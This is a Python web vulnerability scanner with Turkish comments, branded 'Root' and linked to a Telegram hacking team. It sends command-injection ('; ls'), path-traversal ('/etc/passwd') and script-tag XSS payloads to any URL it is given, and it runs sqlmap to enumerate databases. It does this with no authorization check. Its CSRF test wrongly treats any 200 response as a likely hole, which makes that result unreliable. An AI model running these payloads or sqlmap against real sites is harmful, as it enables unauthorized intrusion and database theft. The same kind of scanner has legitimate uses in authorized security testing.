import requests
from bs4 import BeautifulSoup
import argparse
from termcolor import colored
import subprocess
import sys
import os
import pyfiglet
import colorama
from colorama import Fore, Back, Style
import socket
from urllib.parse import urlparse
import re

# ASCII Sanatı
def display_ascii_art():
    # Figlet formatında "Root" metnini yazdır
    metin = "Root"
    ascii_art = pyfiglet.figlet_format(metin)
    # Renkleri uygula (kırmızı)
    renkli_ascii = Fore.RED + ascii_art
    
    # colorama'yı başlat
    colorama.init()
    
    # ASCII sanatını yazdır
    print(renkli_ascii)
    
    # "t.me/sarsilmazhackteam" yazısını ASCII sanatının altına yazdır
    print(colored("t.me/sarsilmazhackteam", 'red'))

# URL Doğrulama
def validate_url(url):
    # URL'nin http:// veya https:// ile başladığından emin ol
    pattern = r"^https?://"
    if not re.match(pattern, url):
        print(f"[!] Geçersiz URL formatı: {url}. Lütfen 'http://' veya 'https://' ile başlayın.")
        sys.exit(1)

# Güvenli HTTP isteği
def safe_request(url, method='GET', data=None):
    try:
        if method == 'POST':
            response = requests.post(url, data=data, timeout=10)
        else:
            response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] HTTP isteği başarısız: {str(e)}", 'red'))
        sys.exit(1)

# SQLMap ile Veritabanı Tespiti
def detect_sql_database(url):
    print(colored("[*] SQLMap ile veritabanları tespit ediliyor...", 'yellow'))
    try:
        # sqlmap komutunu çalıştır
        command = ["sqlmap", "-u", url, "--batch", "--dbs", "--output-dir=/tmp/sqlmap_output"]
        result = subprocess.run(command, capture_output=True, text=True)

        # SQLMap çıktısını sadece veritabanı isimleriyle yazdır
        if "available databases" in result.stdout.lower():
            # Veritabanı isimlerini bul ve yazdır
            databases = []
            in_databases_section = False
            for line in result.stdout.splitlines():
                # Filtreleme işlemi yaparak veritabanı isimlerini al
                if "available databases" in line.lower():
                    in_databases_section = True
                    continue
                if in_databases_section:
                    if line.strip().startswith("[*]"):
                        continue  # Bu satırı atla
                    if line.strip():
                        databases.append(line.strip())
            if databases:
                print(colored("[!] Bulunan veritabanları:", 'red'))
                for db in databases:
                    print(db)
        else:
            print(colored("[+] SQL Injection açığı bulunamadı veya SQLMap çalıştırılamadı.", 'green'))
    except FileNotFoundError:
        print(colored("[!] SQLMap yüklü değil. Lütfen sqlmap'in kurulu olduğundan emin olun.", 'red'))
    except Exception as e:
        print(colored(f"[!] SQLMap çalıştırılırken bir hata oluştu: {str(e)}", 'red'))

# Komut Enjeksiyonu Testi
def test_command_injection(url):
    payload = "; ls"
    test_url = f"{url}{payload}"
    response = safe_request(test_url)
    if "bin" in response.text or "usr" in response.text:
        print(colored("[!] Komut Enjeksiyonu açığı bulundu!", 'red'))
        return True
    print(colored("[+] Komut Enjeksiyonu açığı bulunamadı.", 'green'))
    return False

# Dizin Gezinmesi Testi
def test_open_directory(url):
    response = safe_request(url)
    if "index of" in response.text.lower() or "parent directory" in response.text.lower():
        print(colored("[!] Açık dizin tespit edildi!", 'red'))
        return True
    print(colored("[+] Açık dizin bulunamadı.", 'green'))
    return False

# Dosya Dahil Etme Testi
def test_file_inclusion(url):
    payload = "?page=../../../../etc/passwd"
    test_url = f"{url}{payload}"
    response = safe_request(test_url)
    if "root:" in response.text:
        print(colored("[!] Dosya Dahil Etme açığı bulundu!", 'red'))
        return True
    print(colored("[+] Dosya Dahil Etme açığı bulunamadı.", 'green'))
    return False

# XSS Testi
def test_xss(url):
    payload = "<script>alert('XSS')</script>"
    test_url = f"{url}{payload}"
    response = safe_request(test_url)
    if payload in response.text:
        print(colored("[!] XSS açığı bulundu!", 'red'))
        return True
    print(colored("[+] XSS açığı bulunamadı.", 'green'))
    return False

# CSRF Testi
def test_csrf(url):
    print(colored("[*] CSRF açığı taranıyor...", 'yellow'))
    try:
        # Basit bir CSRF test payload'ı
        payload = {
            'username': 'test',
            'password': 'test',
            'submit': 'Submit'
        }
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            print(colored("[!] CSRF açığı olabilir.", 'red'))
        else:
            print(colored("[+] CSRF açığı bulunamadı.", 'green'))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] CSRF testi sırasında hata oluştu: {str(e)}", 'red'))

# Port Taraması
def scan_ports(url):
    # URL'yi parse et ve host bilgisi al
    parsed_url = urlparse(url)
    host = parsed_url.hostname  # Bu, URL'den sadece domain kısmını alır

    print(f"[+] Port taraması başlatılıyor: {host}")

    # Test edilecek portlar (örneğin 80, 443)
    ports = [80, 443, 8080]

    for port in ports:
        try:
            # Socket bağlantısı kurma
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)  # Zaman aşımı süresi (1 saniye)
            result = s.connect_ex((host, port))
            
            if result == 0:
                print(f"[+] {host}:{port} - Bağlantı başarılı")
            else:
                print(f"[-] {host}:{port} - Bağlantı başarısız")
            s.close()
        except socket.error as e:
            print(f"[!] Hata: {e}")

# Tarama Fonksiyonu
def scan_url(url):
    print(colored(f"\n[+] {url} taranıyor...\n", 'yellow'))
    test_command_injection(url)
    test_open_directory(url)
    test_file_inclusion(url)
    detect_sql_database(url)
    test_xss(url)
    test_csrf(url)
    scan_ports(url)

# Ana Fonksiyon
def main():
    display_ascii_art()
    parser = argparse.ArgumentParser(description="Linux İçin Güvenli Web Zafiyeti Tarayıcı")
    parser.add_argument("url", help="Taranacak URL")
    args = parser.parse_args()

    # URL'nin geçerli olup olmadığını kontrol et
    validate_url(args.url)

    scan_url(args.url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] İşlem kullanıcı tarafından durduruldu.", 'red'))
        sys.exit(0)
                    
